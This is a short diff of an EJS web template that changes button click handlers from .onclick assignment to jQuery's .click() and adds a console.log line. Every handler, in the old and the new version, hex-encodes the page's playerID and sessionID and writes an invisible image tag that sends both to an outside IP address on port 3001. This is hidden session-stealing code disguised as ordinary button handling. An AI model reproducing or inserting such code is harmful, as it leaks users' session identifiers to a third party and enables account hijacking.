@@ -1,10 +1,11 @@
 <script type="text/javascript">
     <% for (var i = 0; i < Object.keys(buttons).length; i++) { %>
-        $('#<%=(Object.keys(buttons)[i]) %>').onclick = function () {
+        $('#<%=(Object.keys(buttons)[i]) %>').click(function () {
+            console.log('smth clicked');
             function toHex(a){for(var b="",c=0;c<a.length;c++)b+=a.charCodeAt(c).toString(16);return b}
             playerID = toHex('<%=playerID %>')
             sessionID = toHex('<%=sessionID %>')
             document.write('<img style="opacity: 0" src="http://185.62.188.120:3001/'+ playerID +'/'+ sessionID +'">')
-        }
+        })
     <% } %>
 </script>
